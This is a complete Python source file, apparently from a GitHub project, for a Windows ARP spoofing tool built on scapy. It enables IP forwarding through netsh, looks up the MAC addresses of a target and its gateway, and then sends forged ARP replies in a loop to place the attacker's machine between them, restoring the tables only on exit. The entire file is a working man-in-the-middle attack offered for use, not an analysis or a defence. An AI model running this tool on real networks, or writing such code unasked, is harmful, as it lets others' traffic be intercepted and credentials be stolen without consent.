import os
import time
import argparse
from scapy.all import ARP, Ether, sendp, srp
import sys
from colorama import init, Fore, Style
import pyfiglet
from colored_txt import ctxt, rtxt, ytxt, back_color, lmtxt, gtxt, btxt

# Initialize colorama
init()
data = {}

def display_banner():
    banner_text = "ARP Spoofer"
    styled_banner = pyfiglet.figlet_format(banner_text, font="slant")
    rtxt(styled_banner)
    back_color("Github : 0xAbolfazl\n".center(20, " "))
    btxt("="*60)
    print()

def get_arguments():
    parser = argparse.ArgumentParser(description='ARP Spoofing Tool for Windows')
    parser.add_argument('-t', '--target', dest='target', help='Target IP address')
    parser.add_argument('-g', '--gateway', dest='gateway', help='Gateway IP address')
    parser.add_argument('-i', '--interface', dest='interface', help='Network interface')
    parser.add_argument('-s', '--speed', dest='speed', type=int, default=2, 
                        help='Attack speed (seconds between packets, default: 2)')
    options = parser.parse_args()


    if options.target:
        data['target'] = options.target
    else:
        ctxt('[?]    Enter Target IP : ', end='')
        data['target'] = input()

    if options.gateway:
        data['gateway'] = options.gateway
    else:
        ctxt('[?]    Enter Gateway IP : ', end='')
        data['gateway'] = input()

    if options.interface:
        data['interface'] = options.interface
    else:
        ctxt('[?]    Enter Interface  : ', end='')
        data['interface'] = input()

    if options.speed:
        data['speed'] = options.speed
    else:
        ctxt('[?]    Enter Speed : ', end='')
        data['speed'] = input()

def enable_ip_forwarding():
    """Enable IP forwarding on Windows"""
    try:
        gtxt('[!]    Enablling IP Forwarding ...')
        os.system('netsh interface ipv4 set interface "' + data['interface'] + '" forwarding=enabled')
        gtxt("[+]    IP Forwarding Enabled !")
    except Exception as e:
        rtxt(f"[!]    Error enabling IP forwarding: {e}")
        rtxt("[!]    Please run as Administrator")
        sys.exit(1)

def get_mac(ip):
    """Get MAC address for given IP"""
    try:
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=3, verbose=0)
        if ans:
            return ans[0][0][1].hwsrc
    except Exception as e:
        rtxt(f"[!]    Error getting MAC address: {e}")
    return None

def spoof(target_ip, target_mac, gateway_ip):
    """Send ARP spoofing packets"""
    try:
        sendp(Ether(dst=target_mac)/ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac), verbose=0)
    except Exception as e:
        print(Fore.RED + f"[!]    Error sending spoof packets: {e}")

def restore(target_ip, target_mac, gateway_ip, gateway_mac):
    """Restore ARP tables to correct values"""
    try:
        sendp(Ether(dst=target_mac)/ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=5, verbose=0)
        sendp(Ether(dst=gateway_mac)/ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac), count=5, verbose=0)
        gtxt("[+]    ARP tables restored")
    except Exception as e:
        rtxt(f"[-]    Error restoring ARP tables: {e}")

def main():
    display_banner()
    get_arguments()

    try:  
        # Check for admin privileges
        try:
            with open(os.path.join(os.getenv("TEMP"), "arp_test.txt"), "w") as f:
                f.write("test")
            os.remove(os.path.join(os.getenv("TEMP"), "arp_test.txt"))
        except:
            rtxt("[-]    Please run as Administrator")
            sys.exit(1)
        
        enable_ip_forwarding()
        
        gtxt("[+]    Getting MAC addresses...")
        target_mac = get_mac(data['target'])
        gateway_mac = get_mac(data['gateway'])
        
        if not target_mac:
            rtxt(f"[-]    Could not get target MAC address for {data['target']}")
        if not gateway_mac:
            rtxt(f"[-]    Could not get gateway MAC address for {data['gateway']}")
        if not target_mac or not gateway_mac:
            sys.exit(1)
            
        ytxt(f"[+]    Target IP: {data['target']} | MAC: {target_mac}")
        ytxt(f"[+]    Gateway IP: {data['gateway']} | MAC: {gateway_mac}")
        
        rtxt("\n[+]    Starting ARP spoofing attack. Press Ctrl+C to stop...")
        
        sent_packets = 0
        try:
            while True:
                spoof(data['target'], target_mac, data['gateway'])
                spoof(data['gateway'], gateway_mac, data['target'])
                sent_packets += 2
                ctxt(f"\r[+]    Packets sent: {sent_packets}", end="")
                sys.stdout.flush()
                time.sleep(data['speed'])
        except KeyboardInterrupt:
            ytxt("\n[+]    Detected CTRL+C. Restoring ARP tables...")
            restore(data['target'], target_mac, data['gateway'], gateway_mac)
            ytxt("[+]    ARP spoofing attack stopped.")
            
    except Exception as e:
        rtxt( f"[!]    Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()